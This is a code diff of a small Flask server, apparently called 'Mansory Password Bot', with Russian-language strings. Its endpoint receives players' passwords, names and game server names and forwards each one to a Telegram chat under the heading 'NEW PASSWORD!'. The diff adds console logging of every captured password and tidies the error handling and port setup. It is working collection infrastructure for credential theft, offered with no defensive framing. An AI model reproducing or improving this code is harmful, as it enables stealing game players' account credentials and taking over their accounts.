@@ -1,8 +1,7 @@
 from flask import Flask, request
 import requests
-import os
-import json
 from datetime import datetime
+import os
 
 app = Flask(__name__)
 
@@ -20,15 +19,15 @@ def save_password():
         name = request.args.get('name', 'Unknown')
         server = request.args.get('server', 'Unknown')
     
+    print(f"Получен пароль: {password} | Игрок: {name} | Сервер: {server}")
+    
     if password:
-        # Отправляем в Telegram
         message = f"🔑 НОВЫЙ ПАРОЛЬ!\n\n👤 Игрок: {name}\n🌐 Сервер: {server}\n🔐 Пароль: {password}\n🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         
         tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         tg_data = {
             "chat_id": CHAT_ID,
-            "text": message,
-            "parse_mode": "HTML"
+            "text": message
         }
         
         try:
@@ -36,15 +35,16 @@ def save_password():
             if response.status_code == 200:
                 return "OK", 200
             else:
-                return "TG Error", 500
-        except:
-            return "Error", 500
+                return f"TG Error: {response.status_code}", 500
+        except Exception as e:
+            return f"Error: {str(e)}", 500
     
     return "No password", 400
 
 @app.route('/')
 def index():
-    return "Mansory Password Bot is running!"
+    return "Mansory Bot is running!"
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
